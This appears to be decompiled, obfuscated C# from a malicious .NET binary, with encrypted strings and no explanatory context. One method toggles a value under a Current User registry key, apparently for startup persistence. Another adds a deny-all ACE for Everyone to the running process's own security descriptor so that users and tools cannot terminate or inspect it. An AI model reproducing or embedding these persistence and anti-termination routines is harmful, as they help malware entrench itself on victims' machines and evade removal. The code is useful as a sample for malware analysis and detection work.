using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace RshJmeUGgeNp;

internal sealed class TLGlblqxmPq
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr hMJfBQkNZBSsC, int KAAgMYGZeddZn, [Out] byte[] KTDtiEYXUfrG, uint OIxmHXlLVTdga, out uint sOXorHjxYTcb);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr PZDeiYGPqrTM, int asNovTgOpFzS, [In] byte[] kCfEJSLTEW);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void bVjoKpVOWlMeDWpp(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(getString_0(107405259));
			if (bool_0 && registryKey.GetValue(getString_0(107404702)) != null)
			{
				registryKey.DeleteValue(getString_0(107404702));
			}
			else
			{
				registryKey.SetValue(getString_0(107404702), getString_0(107407957));
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor xFoNlwGfYFjOdI(IntPtr intptr_0)
	{
		byte[] kTDtiEYXUfrG = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, kTDtiEYXUfrG, 0u, out var sOXorHjxYTcb);
		if ((long)sOXorHjxYTcb > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, kTDtiEYXUfrG = new byte[sOXorHjxYTcb], sOXorHjxYTcb, out sOXorHjxYTcb))
		{
			return null;
		}
		return new RawSecurityDescriptor(kTDtiEYXUfrG, 0);
	}

	private void ANusNDvyLTJPh(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void ViFGHVVBbOTpF()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = xFoNlwGfYFjOdI(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			ANusNDvyLTJPh(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static TLGlblqxmPq()
	{
		Strings.CreateGetStringDelegate(typeof(TLGlblqxmPq));
	}
}
